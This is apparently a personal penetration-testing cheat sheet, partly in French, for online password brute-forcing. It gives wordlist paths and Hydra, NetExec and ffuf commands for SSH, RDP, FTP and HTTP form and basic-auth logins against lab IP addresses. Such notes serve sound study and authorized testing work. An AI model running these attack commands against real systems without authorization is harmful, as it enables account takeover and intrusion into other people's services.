# Online bruteforce

## Wordlists

```bash
cd /usr/share/wordlists/
sudo gzip -d rockyou.txt.gz
/usr/share/wordlists/rockyou.txt
   
/usr/share/wordlists
├── dirb -> /usr/share/dirb/wordlists
├── dirbuster -> /usr/share/dirbuster/wordlists
├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
├── john.lst -> /usr/share/john/password.lst
├── legion -> /usr/share/legion/wordlists
├── metasploit -> /usr/share/metasploit-framework/data/wordlists
├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
├── rockyou.txt
├── sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
├── wfuzz -> /usr/share/wfuzz/wordlist
└── wifite.txt -> /usr/share/dict/wordlist-probable.txt
```
## SSH

```bash
# Hydra (BETTER than NXC)
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

# List of users using wordlists
hydra -L users.txt -P <passwordList> -s port <IP> ssh

# Only one user and wordlist passwords
hydra -l root -P <passwordList> -s port <IP> ssh

# NXC
nxc ssh 192.168.50.201 --port 2222 -u george -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

## RDP

```bash
# Hydra
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperPassword" rdp://192.168.50.202

# NXC
nxc rdp 192.168.150.202 -u /usr/share/wordlists/dirb/others/names.txt -p "SuperPassword"
```

## FTP

```bash
# Hydra
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.150.202

# NXC (BETTER than Hydra)
nxc ftp 192.168.150.202 -u itadmin -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

## HTTP

### Hydra 

```bash
# POST login/password BODY
hydra -l admin -P <passwordList> target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# Basic auth b64 (Header Authorization: Basic)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.174.201 http-get /
```
### ffuf

``` bash
# Burp -> clic droit sur la requête -> Copy to file / Save selected text to file -> `request.txt`

# Mot-clé par défaut -> placer `FUZZ` dans la requête
ffuf -request ./request.txt -w ./wordlist.txt

# Mots-clés personnalisés -> placer `FUZZUSR` et `FUZZPW` dans la requête
ffuf -request ./request.txt -request-proto http -w ./username.txt:FUZZUSR,./password.txt:FUZZPW

## options
-fc 401                # filter by status code 
-fs 1234               # filter by response size 
-fw 10                 # filter by word count 
-fr "mot_clef"         # filter by regex dans la réponse
-r                     # suit les redirections 302
-rate 10               # limite à 10 requêtes/seconde
-t 1                   # limite à 1 thread
-debug-log ./debug.log # log complet dans un fichier
-request-proto http

# si http, supprimer Upgrade-Insecure-Requests: 1 de request.txt


# BASE64 - BASIC AUTH (utiliser hydra http-get)
https://github.com/ffuf/ffuf-scripts
./ffuf-scripts/ffuf_basicauth.sh usernames.txt passwords.txt | ffuf -w -:AUTHFUZZ -request brute.req.txt -request-proto http
echo AUTHFUZZ | base64 --decode
```